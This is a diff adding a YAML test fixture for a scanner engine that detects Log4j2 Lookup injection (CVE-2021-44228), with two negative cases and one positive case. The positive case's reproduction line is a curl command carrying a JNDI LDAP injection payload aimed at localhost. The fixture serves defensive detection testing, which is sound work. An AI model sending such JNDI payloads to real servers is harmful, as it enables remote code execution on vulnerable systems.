@@ -1,0 +1,49 @@
+# G.1/组 D fixture：Log4j2 Lookup 注入检测（check 型，CVE-2021-44228 系列）正反例。
+# 引擎判定：注入 ${lookup} 变体后响应中"字面量消失且出现解析值"（基线无）→ 报 Critical
+# 「Log4j2 Lookup注入」；字面量被原样回显（未解析）不加带外命中则不算 → 不报。
+module: vulnclaw.engines.framework_zero_day_engines
+class: Log4ShellEngine
+engine: log4shell
+
+cases:
+  - id: log4shell_lookup_resolved_inband
+    method: check
+    expect: positive
+    url: http://127.0.0.1:8080/search?q=x
+    param: q
+    parsed_query: "q=x"
+    normal_resp: [200, "ok", {}]
+    responses:
+      /search:
+        status: 200
+        body: "Java version: 17.0.9 (OpenJDK) search results"
+    evidence_contains: "JNDI"
+    reproduction: "curl -sS --get 'http://127.0.0.1:8080/search' --data-urlencode 'q=${jndi:ldap://127.0.0.1:1389/FIXTURE}'  # 触发服务端解析 Lookup"
+
+  - id: log4shell_literal_echoed_not_parsed
+    method: check
+    expect: negative
+    url: http://127.0.0.1:8080/search?q=x
+    param: q
+    parsed_query: "q=x"
+    normal_resp: [200, "ok", {}]
+    responses:
+      /search:
+        status: 200
+        body: 'echo: ${sys:java.version}'
+    evidence_contains: ""
+    reproduction: ""
+
+  - id: log4shell_no_echo_endpoint
+    method: check
+    expect: negative
+    url: http://127.0.0.1:8080/search?q=x
+    param: q
+    parsed_query: "q=x"
+    normal_resp: [200, "ok", {}]
+    responses:
+      /search:
+        status: 400
+        body: "Bad Request"
+    evidence_contains: ""
+    reproduction: ""
